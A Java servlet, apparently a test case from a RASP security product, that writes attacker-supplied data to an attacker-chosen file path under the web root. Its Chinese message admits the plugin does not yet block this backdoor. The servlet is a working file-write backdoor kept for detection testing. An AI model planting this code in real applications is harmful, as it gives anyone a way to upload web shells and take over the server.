package com.baidu.rasp;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * @description: 文件写入
 * @author: anyang
 * @create: 2019/05/15 14:26
 */
public class WriteFile extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String bytes = req.getParameter("filedata");
        String fname = req.getParameter("filename");
        if (fname == null || bytes == null) {
            resp.getWriter().println("<p>注意: 由于可能产生误报，所以目前官方插件不会拦截这种使用 FileOutputStream 写文件的后门，我们会尽快解决</p>");
        } else {
            try {
                String path;
                ServletContext application = this.getServletContext();
                String serverInfo = application.getServerInfo();
                if (serverInfo != null && serverInfo.toLowerCase().contains("weblogic")) {
                    path = application.getResource("/").getPath() + "/" + fname;
                } else {
                    path = application.getRealPath("/") + "/" + fname;
                }
                FileOutputStream os = new FileOutputStream(path);
                PrintWriter writer = new PrintWriter(os);
                writer.print(bytes);
                writer.close();
                resp.getWriter().println("==>" + path);
            } catch (Exception e) {
                resp.getWriter().print(e);
            }
        }
    }
}
